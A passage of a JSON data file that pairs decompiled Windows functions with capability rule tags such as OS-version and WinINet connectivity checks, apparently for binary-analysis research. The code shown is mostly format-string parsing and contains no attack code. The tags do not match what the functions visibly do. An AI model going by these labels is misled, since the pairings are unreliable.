        "decompiled_code": "\nuint32_t __cdecl fcn.00448aed(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 2;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.004401db(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 363
    },
    "00448b67": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448b67(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 2;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.004401db(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "00448be1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448be1(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 2;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.004401db(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 364
    },
    "00448c5b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00448c5b(uint *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 1;\n    arg_8h_00 = *(in_ECX + 8);\n    var_4h = *(in_ECX + 0xc) - 2;\n    uVar1 = *(arg_8h_00 + 0x18);\n    uVar2 = *(arg_8h_00 + 0x1c);\n    uVar3 = fcn.004401db(arg_8h_00, var_4h, &var_4h, 10, 1);\n    *arg_8h = uVar3;\n    if (((*(*(in_ECX + 8) + 0x1c) == '\\0') || (*(*(in_ECX + 8) + 0x18) != 0x22)) && (*(in_ECX + 0xc) <= var_4h)) {\n        *(in_ECX + 0xc) = var_4h;\n    }\n    else {\n        uVar4 = 0;\n    }\n    *(arg_8h_00 + 0x18) = uVar1;\n    *(arg_8h_00 + 0x1c) = uVar2;\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 365
    },
    "00448cd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00448cd5(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t arg_ch;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar7;\n    uint arg_8h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    arg_8h = *(param_1 + 8);\n    cVar2 = fcn.00454002(arg_8h);\n    if (cVar2 != '\\0') {\n        puVar6 = *(param_1 + 0xc);\n        if (puVar6 != NULL) {\n            iVar4 = *(param_1 + 0x450) + 1;\n            *(param_1 + 0x450) = iVar4;\n            do {\n                if (iVar4 == 2) {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar3 = *puVar6;\n                puVar6 = puVar6 + 1;\n                _auStack8 = _auStack8 & 0xffffff | uVar3 << 0x18;\n                *(param_1 + 0xc) = puVar6;\n                *(param_1 + 0x2d) = uVar3;\n                if (uVar3 != 0) {\n                    var_10h = var_10h & 0xffffff00 | uVar3;\n                    do {\n                        if (*(param_1 + 0x14) < 0) break;\n                        arg_ch = *(param_1 + 0x18);\n                        uVar7 = var_10h;\n                        uVar3 = fcn.00447b9e(var_10h, arg_ch);\n                        *(param_1 + 0x18) = uVar3;\n                        if (7 < uVar3) {\n                            iVar4 = *(param_1 + 8);\n                            *(iVar4 + 0x1c) = 1;\n                            *(iVar4 + 0x18) = 0x16;\n                            goto code_r0x00448d0b;\n                        }\n                        uVar5 = uVar3;\n                        if (7 < uVar5) {\n                            return 0xffffffff;\n                        }\n    // switch table (8 cases) at 0x448f75\n                        switch(uVar5) {\n                        case 0:\n                            uVar7 = *(param_1 + 8);\n                            *(param_1 + 0x38) = 0;\n                            var_8h = uVar7;\n                            if (*(uVar7 + 0x14) == '\\0') {\n                                fcn.00453bd0();\n                                uVar5 = *(param_1 + 8);\n                                var_8h = uVar5;\n                            }\n                            uVar3 = *(param_1 + 0x2d);\n                            var_14h = uVar5 & 0xffffff00 | uVar3;\n                            iVar4 = fcn.00455ad2(**(uVar7 + 0xc), uVar3, 0x8000);\n                            if (iVar4 != 0) {\n                                fcn.00454e8e(var_14h, param_1 + 0x14, var_8h);\n                                uVar3 = **(param_1 + 0xc);\n                                *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                                *(param_1 + 0x2d) = uVar3;\n                                if (uVar3 == 0) {\n                                    iVar4 = *(param_1 + 8);\n                                    *(iVar4 + 0x1c) = 1;\n                                    *(iVar4 + 0x18) = 0x16;\n                                    fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                    iVar4 = *(param_1 + 8);\n                                    *(iVar4 + 0x1c) = 1;\n                                    *(iVar4 + 0x18) = 0x16;\n                                    fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                    return 0xffffffff;\n                                }\n                            }\n                            var_ch = var_ch & 0xffffff00 | uVar3;\n                            fcn.00454e8e(var_ch, param_1 + 0x14, *(param_1 + 8));\n                            break;\n                        case 1:\n                            *(param_1 + 0x24) = 0xffffffff;\n                            *(param_1 + 0x20) = 0;\n                            *(param_1 + 0x2c) = 0;\n                            *(param_1 + 0x1c) = 0;\n                            *(param_1 + 0x28) = 0;\n                            *(param_1 + 0x38) = 0;\n                            break;\n                        case 2:\n                            if (var_1h == ' ') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                            }\n                            else if (var_1h == '#') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                            }\n                            else if (var_1h == '+') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                            }\n                            else if (var_1h == '-') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            }\n                            else if (var_1h == '0') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                            }\n                            break;\n                        case 3:\n                            if (var_1h != '*') {\n                                iVar4 = param_1 + 0x20;\n                                goto code_r0x00448e74;\n                            }\n                            piVar1 = *(param_1 + 0x10);\n                            *(param_1 + 0x10) = piVar1 + 1;\n                            iVar4 = *piVar1;\n                            *(param_1 + 0x20) = iVar4;\n                            if (iVar4 < 0) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                                *(param_1 + 0x20) = -iVar4;\n                            }\ncode_r0x00448e99:\n                            cVar2 = '\\x01';\n                            goto code_r0x00448ed5;\n                        case 4:\n                            *(param_1 + 0x24) = 0;\n                            break;\n                        case 5:\n                            if (var_1h == '*') {\n                                piVar1 = *(param_1 + 0x10);\n                                *(param_1 + 0x10) = piVar1 + 1;\n                                iVar4 = *piVar1;\n                                *(param_1 + 0x24) = iVar4;\n                                if (iVar4 < 0) {\n                                    *(param_1 + 0x24) = 0xffffffff;\n                                }\n                                goto code_r0x00448e99;\n                            }\n                            iVar4 = param_1 + 0x24;\ncode_r0x00448e74:\n                            cVar2 = fcn.00448729(iVar4);\n                            goto code_r0x00448ed5;\n                        case 6:\n                            cVar2 = fcn.0044c423();\n                            goto code_r0x00448ed5;\n                        case 7:\n                            cVar2 = fcn.0044d575(uVar7, arg_ch, arg_8h, unaff_EDI, unaff_ESI, unaff_EBX, var_14h, \n                                                 var_10h, var_ch, var_8h, _auStack8);\ncode_r0x00448ed5:\n                            if (cVar2 == '\\0') {\n                                return 0xffffffff;\n                            }\n                        }\n                        uVar3 = **(param_1 + 0xc);\n                        puVar6 = *(param_1 + 0xc) + 1;\n                        *(param_1 + 0xc) = puVar6;\n                        _auStack8 = _auStack8 & 0xffffff | uVar3 << 0x18;\n                        *(param_1 + 0x2d) = uVar3;\n                        var_10h = var_10h & 0xffffff00 | uVar3;\n                    } while (uVar3 != 0);\n                }\n                if ((*(param_1 + 0x18) != '\\0') && (*(param_1 + 0x18) != '\\a')) break;\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                iVar4 = *(param_1 + 0x450);\n            } while( true );\n        }\n        iVar4 = *(param_1 + 8);\n        *(iVar4 + 0x18) = 0x16;\n        *(iVar4 + 0x1c) = 1;\ncode_r0x00448d0b:\n        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 2297
    },
    "00449269": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00449269(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t arg_ch;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar7;\n    uint arg_8h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    arg_8h = *(param_1 + 8);\n    cVar2 = fcn.00454002(arg_8h);\n    if (cVar2 != '\\0') {\n        puVar6 = *(param_1 + 0xc);\n        if (puVar6 != NULL) {\n            iVar4 = *(param_1 + 0x450) + 1;\n            *(param_1 + 0x450) = iVar4;\n            do {\n                if (iVar4 == 2) {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar3 = *puVar6;\n                puVar6 = puVar6 + 1;\n                _auStack8 = _auStack8 & 0xffffff | uVar3 << 0x18;\n                *(param_1 + 0xc) = puVar6;\n                *(param_1 + 0x2d) = uVar3;\n                if (uVar3 != 0) {\n                    var_10h = var_10h & 0xffffff00 | uVar3;\n                    do {\n                        if (*(param_1 + 0x14) < 0) break;\n                        arg_ch = *(param_1 + 0x18);\n                        uVar7 = var_10h;\n                        uVar3 = fcn.00447c18(var_10h, arg_ch);\n                        *(param_1 + 0x18) = uVar3;\n                        if (7 < uVar3) {\n                            iVar4 = *(param_1 + 8);\n                            *(iVar4 + 0x1c) = 1;\n                            *(iVar4 + 0x18) = 0x16;\n                            goto code_r0x0044929f;\n                        }\n                        uVar5 = uVar3;\n                        if (7 < uVar5) {\n                            return 0xffffffff;\n                        }\n    // switch table (8 cases) at 0x4494f9\n                        switch(uVar5) {\n                        case 0:\n                            uVar7 = *(param_1 + 8);\n                            *(param_1 + 0x38) = 0;\n                            var_8h = uVar7;\n                            if (*(uVar7 + 0x14) == '\\0') {\n                                fcn.00453bd0();\n                                uVar5 = *(param_1 + 8);\n                                var_8h = uVar5;\n                            }\n                            uVar3 = *(param_1 + 0x2d);\n                            var_14h = uVar5 & 0xffffff00 | uVar3;\n                            iVar4 = fcn.00455ad2(**(uVar7 + 0xc), uVar3, 0x8000);\n                            if (iVar4 != 0) {\n                                fcn.00454e8e(var_14h, param_1 + 0x14, var_8h);\n                                uVar3 = **(param_1 + 0xc);\n                                *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                                *(param_1 + 0x2d) = uVar3;\n                                if (uVar3 == 0) {\n                                    iVar4 = *(param_1 + 8);\n                                    *(iVar4 + 0x1c) = 1;\n                                    *(iVar4 + 0x18) = 0x16;\n                                    fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                    iVar4 = *(param_1 + 8);\n                                    *(iVar4 + 0x1c) = 1;\n                                    *(iVar4 + 0x18) = 0x16;\n                                    fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                    return 0xffffffff;\n                                }\n                            }\n                            var_ch = var_ch & 0xffffff00 | uVar3;\n                            fcn.00454e8e(var_ch, param_1 + 0x14, *(param_1 + 8));\n                            break;\n                        case 1:\n                            *(param_1 + 0x24) = 0xffffffff;\n                            *(param_1 + 0x20) = 0;\n                            *(param_1 + 0x2c) = 0;\n                            *(param_1 + 0x1c) = 0;\n                            *(param_1 + 0x28) = 0;\n                            *(param_1 + 0x38) = 0;\n                            break;\n                        case 2:\n                            if (var_1h == ' ') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                            }\n                            else if (var_1h == '#') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                            }\n                            else if (var_1h == '+') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                            }\n                            else if (var_1h == '-') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            }\n                            else if (var_1h == '0') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                            }\n                            break;\n                        case 3:\n                            if (var_1h != '*') {\n                                iVar4 = param_1 + 0x20;\n                                goto code_r0x00449408;\n                            }\n                            piVar1 = *(param_1 + 0x10);\n                            *(param_1 + 0x10) = piVar1 + 1;\n                            iVar4 = *piVar1;\n                            *(param_1 + 0x20) = iVar4;\n                            if (iVar4 < 0) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                                *(param_1 + 0x20) = -iVar4;\n                            }\ncode_r0x0044942d:\n                            cVar2 = '\\x01';\n                            goto code_r0x00449469;\n                        case 4:\n                            *(param_1 + 0x24) = 0;\n                            break;\n                        case 5:\n                            if (var_1h == '*') {\n                                piVar1 = *(param_1 + 0x10);\n                                *(param_1 + 0x10) = piVar1 + 1;\n                                iVar4 = *piVar1;\n                                *(param_1 + 0x24) = iVar4;\n                                if (iVar4 < 0) {\n                                    *(param_1 + 0x24) = 0xffffffff;\n                                }\n                                goto code_r0x0044942d;\n                            }\n                            iVar4 = param_1 + 0x24;\ncode_r0x00449408:\n                            cVar2 = fcn.00448819(iVar4);\n                            goto code_r0x00449469;\n                        case 6:\n                            cVar2 = fcn.0044c6d5();\n                            goto code_r0x00449469;\n                        case 7:\n                            cVar2 = fcn.0044dc08(uVar7, arg_ch, arg_8h, unaff_EDI, unaff_ESI, unaff_EBX, var_14h, \n                                                 var_10h, var_ch, var_8h, _auStack8);\ncode_r0x00449469:\n                            if (cVar2 == '\\0') {\n                                return 0xffffffff;\n                            }\n                        }\n                        uVar3 = **(param_1 + 0xc);\n                        puVar6 = *(param_1 + 0xc) + 1;\n                        *(param_1 + 0xc) = puVar6;\n                        _auStack8 = _auStack8 & 0xffffff | uVar3 << 0x18;\n                        *(param_1 + 0x2d) = uVar3;\n                        var_10h = var_10h & 0xffffff00 | uVar3;\n                    } while (uVar3 != 0);\n                }\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                iVar4 = *(param_1 + 0x450);\n            } while( true );\n        }\n        iVar4 = *(param_1 + 8);\n        *(iVar4 + 0x1c) = 1;\n        *(iVar4 + 0x18) = 0x16;\ncode_r0x0044929f:\n        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 2256
    },
    "00449519": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.00449519(uint32_t param_1, uint param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t arg_ch;\n    uint8_t *puVar6;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint arg_8h;\n    uint arg_8h_00;\n    uchar auStack12 [3];\n    uint32_t var_5h;\n    uint var_1h;\n    \n    arg_8h_00 = *(param_1 + 8);\n    cVar3 = fcn.0045406b(arg_8h_00);\n    if (cVar3 != '\\0') {\n        puVar6 = *(param_1 + 0xc);\n        if (puVar6 != NULL) {\n            iVar5 = *(param_1 + 0x450) + 1;\n            *(param_1 + 0x450) = iVar5;\n            _auStack12 = param_1;\n            unique0x100002b5 = param_1;\n            do {\n                if (iVar5 == 2) {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar4 = *puVar6;\n                puVar6 = puVar6 + 1;\n                stack0xfffffff8 = unique0x10000287 & 0xffffff | uVar4 << 0x18;\n                *(param_1 + 0xc) = puVar6;\n                *(param_1 + 0x2d) = uVar4;\n                if (uVar4 != 0) {\n                    _auStack12 = _auStack12 & 0xffffff | uVar4 << 0x18;\n                    do {\n                        if (*(param_1 + 0x14) < 0) break;\n                        arg_ch = *(param_1 + 0x18);\n                        arg_8h = CONCAT31(var_5h._1_3_, var_5h);\n                        uVar4 = fcn.00447c53(arg_8h, arg_ch);\n                        *(param_1 + 0x18) = uVar4;\n                        if (7 < uVar4) {\n                            iVar5 = *(param_1 + 8);\n                            *(iVar5 + 0x1c) = 1;\n                            *(iVar5 + 0x18) = 0x16;\n                            goto code_r0x0044954e;\n                        }\n                        if (7 < uVar4) {\n                            return 0xffffffff;\n                        }\n    // switch table (8 cases) at 0x4497dd\n                        switch(uVar4) {\n                        case 0:\n                            iVar5 = *(param_1 + 8);\n                            *(param_1 + 0x38) = 0;\n                            if (*(iVar5 + 0x14) == '\\0') {\n                                fcn.00453bd0();\n                            }\n                            cVar3 = *(param_1 + 0x2d);\n                            unique0x10000228 = stack0xfffffff8 & 0xffffff;\n                            iVar5 = fcn.00455ad2(**(iVar5 + 0xc), cVar3, 0x8000);\n                            ppiVar1 = param_1 + 0x448;\n                            if (iVar5 != 0) {\n                                piVar2 = *ppiVar1;\n                                if (piVar2[2] == piVar2[1]) {\n                                    if (*(piVar2 + 3) == '\\0') {\n                                        *(param_1 + 0x14) = 0xffffffff;\n                                    }\n                                    else {\n                                        *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                    }\n                                }\n                                else {\n                                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                    piVar2[2] = piVar2[2] + 1;\n                                    ***ppiVar1 = cVar3;\n                                    **ppiVar1 = **ppiVar1 + 1;\n                                }\n                                cVar3 = **(param_1 + 0xc);\n                                *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                                *(param_1 + 0x2d) = cVar3;\n                                if (cVar3 == '\\0') {\n                                    iVar5 = *(param_1 + 8);\n                                    *(iVar5 + 0x1c) = 1;\n                                    *(iVar5 + 0x18) = 0x16;\n                                    fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                    iVar5 = *(param_1 + 8);\n                                    *(iVar5 + 0x1c) = 1;\n                                    *(iVar5 + 0x18) = 0x16;\n                                    fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                    return 0xffffffff;\n                                }\n                            }\n                            piVar2 = *ppiVar1;\n                            if (piVar2[2] == piVar2[1]) {\n                                if (*(piVar2 + 3) == '\\0') {\n                                    *(param_1 + 0x14) = 0xffffffff;\n                                }\n                                else {\n                                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                }\n                            }\n                            else {\n                                *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                piVar2[2] = piVar2[2] + 1;\n                                ***ppiVar1 = cVar3;\n                                **ppiVar1 = **ppiVar1 + 1;\n                            }\n                            break;\n                        case 1:\n                            *(param_1 + 0x24) = 0xffffffff;\n                            *(param_1 + 0x20) = 0;\n                            *(param_1 + 0x2c) = 0;\n                            *(param_1 + 0x1c) = 0;\n                            *(param_1 + 0x28) = 0;\n                            *(param_1 + 0x38) = 0;\n                            break;\n                        case 2:\n                            if (var_1h == ' ') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                            }\n                            else if (var_1h == '#') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                            }\n                            else if (var_1h == '+') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                            }\n                            else if (var_1h == '-') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            }\n                            else if (var_1h == '0') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                            }\n                            break;\n                        case 3:\n                            if (var_1h != '*') {\n                                iVar5 = param_1 + 0x20;\n                                goto code_r0x0044971a;\n                            }\n                            piVar2 = *(param_1 + 0x10);\n                            *(param_1 + 0x10) = piVar2 + 1;\n                            iVar5 = *piVar2;\n                            *(param_1 + 0x20) = iVar5;\n                            if (iVar5 < 0) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                                *(param_1 + 0x20) = -iVar5;\n                            }\ncode_r0x0044973f:\n                            cVar3 = '\\x01';\n                            goto code_r0x0044977b;\n                        case 4:\n                            *(param_1 + 0x24) = 0;\n                            break;\n                        case 5:\n                            if (var_1h == '*') {\n                                piVar2 = *(param_1 + 0x10);\n                                *(param_1 + 0x10) = piVar2 + 1;\n                                iVar5 = *piVar2;\n                                *(param_1 + 0x24) = iVar5;\n                                if (iVar5 < 0) {\n                                    *(param_1 + 0x24) = 0xffffffff;\n                                }\n                                goto code_r0x0044973f;\n                            }\n                            iVar5 = param_1 + 0x24;\ncode_r0x0044971a:\n                            cVar3 = fcn.00448891(iVar5);\n                            goto code_r0x0044977b;\n                        case 6:\n                            cVar3 = fcn.0044c82e();\n                            goto code_r0x0044977b;\n                        case 7:\n                            cVar3 = fcn.0044df4a(arg_8h, arg_ch, arg_8h_00, unaff_EDI, unaff_ESI, unaff_EBX, _auStack12\n                                                 , stack0xfffffff8, unaff_EBP, unaff_retaddr, param_2);\ncode_r0x0044977b:\n                            if (cVar3 == '\\0') {\n                                return 0xffffffff;\n                            }\n                        }\n                        uVar4 = **(param_1 + 0xc);\n                        puVar6 = *(param_1 + 0xc) + 1;\n                        *(param_1 + 0xc) = puVar6;\n                        stack0xfffffff8 = stack0xfffffff8 & 0xffffff | uVar4 << 0x18;\n                        *(param_1 + 0x2d) = uVar4;\n                        _auStack12 = _auStack12 & 0xffffff | uVar4 << 0x18;\n                    } while (uVar4 != 0);\n                }\n                if ((*(param_1 + 0x18) != '\\0') && (*(param_1 + 0x18) != '\\a')) break;\n                *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n                iVar5 = *(param_1 + 0x450);\n            } while( true );\n        }\n        iVar5 = *(param_1 + 8);\n        *(iVar5 + 0x18) = 0x16;\n        *(iVar5 + 0x1c) = 1;\ncode_r0x0044954e:\n        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 2532
    },
    "004497fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __thiscall fcn.004497fd(uint32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t **ppiVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    uint32_t arg_ch;\n    int32_t iVar6;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint32_t noname_0;\n    uint arg_8h;\n    uint32_t var_4h;\n    \n    arg_8h = *(param_1 + 8);\n    cVar4 = fcn.0045406b(arg_8h);\n    if (cVar4 != '\\0') {\n        var_4h = param_1;\n        if (*(param_1 + 0xc) == 0) {\n            iVar6 = *(param_1 + 8);\n            *(iVar6 + 0x1c) = 1;\n            *(iVar6 + 0x18) = 0x16;\ncode_r0x00449833:\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        }\n        else {\n            do {\n                cVar4 = fcn.004479cd();\n                if (cVar4 == '\\0') {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar2 = **(param_1 + 0xc);\n                *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                *(param_1 + 0x2d) = uVar2;\n                if (uVar2 != 0) {\n                    var_4h = var_4h & 0xffffff00 | uVar2;\n                    do {\n                        if (*(param_1 + 0x14) < 0) break;\n                        arg_ch = *(param_1 + 0x18);\n                        noname_0 = var_4h;\n                        uVar5 = fcn.00447c90(var_4h, arg_ch);\n                        *(param_1 + 0x18) = uVar5;\n                        cVar4 = fcn.00454370();\n                        if (cVar4 == '\\0') {\n                            return 0xffffffff;\n                        }\n    // switch table (8 cases) at 0x449add\n                        switch(*(param_1 + 0x18)) {\n                        case 0:\n                            cVar4 = fcn.0044aca0();\n                            if (cVar4 == '\\0') {\n                                iVar6 = *(param_1 + 